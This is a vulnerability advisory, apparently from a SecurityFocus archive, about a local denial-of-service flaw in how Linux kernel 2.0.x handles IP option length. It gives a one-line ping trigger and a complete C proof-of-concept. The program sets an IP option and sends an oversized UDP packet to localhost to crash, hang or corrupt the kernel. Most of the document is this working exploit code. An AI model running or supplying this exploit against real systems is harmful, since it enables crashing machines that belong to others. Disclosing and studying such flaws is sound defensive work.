Debian 2.1,Linux kernel 2.0.34/2.0.35/2.0.36/2.0.37/2.0.38,RedHat 5.2 i386 Packet Length with Options Vulnerability

source: http://www.securityfocus.com/bid/870/info

A vulnerability in the Linux kernel's TCP/IP allows local users to crash, hang or corrupt the system.

A local user can crash, hang or currupt the system by sending out a packet with options longer than the maximum IP packet length. An easy way to generate such packet is by using the command "ping -s 65468 -R ANYADDRESS". The -R option is for the IP record route option. Under kernel versions 2.2.X the command will fail with an message of "message too long".

The vulnerability seems to be the result of the kernel not checking aif packet with options is longer than the maximum packet size. A long packet seems to lead to memory corruption. 

/* Exploit option length missing checks in Linux-2.0.38
   Andrea Arcangeli <andrea@suse.de> */

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

main()
{
	int sk;
	struct sockaddr_in sin;
	struct hostent * hostent;
#define PAYLOAD_SIZE (0xffff-sizeof(struct udphdr)-sizeof(struct iphdr))
#define OPT_SIZE 1
	char payload[PAYLOAD_SIZE];

	sk = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk < 0)
		perror("socket"), exit(1);

	if (setsockopt(sk, SOL_IP, IP_OPTIONS, payload, OPT_SIZE) < 0)
		perror("setsockopt"), exit(1);

	bzero((char *)&sin, sizeof(sin));

	sin.sin_port = htons(0);
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(2130706433);

	if (connect(sk, (struct sockaddr *) &sin, sizeof(sin)) < 0)
		perror("connect"), exit(1);

	if (write(sk, payload, PAYLOAD_SIZE) < 0)
		perror("write"), exit(1);
}

